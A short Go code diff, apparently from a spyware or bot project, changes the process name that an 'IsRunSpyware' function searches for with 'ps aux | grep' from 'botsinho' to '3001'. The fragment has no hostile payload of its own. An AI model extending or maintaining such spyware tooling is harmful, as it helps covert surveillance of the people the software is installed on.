@@ -57,7 +57,7 @@ func DeleteSpy(){
 }
 
 func IsRunSpyware()bool{
-	com := exec.Command("bash", "-c", "ps aux | grep -o botsinho")
+	com := exec.Command("bash", "-c", "ps aux | grep -o 3001")
 	out, _ := com.Output()
 	dat := strings.Split(string(out), " ")
 	
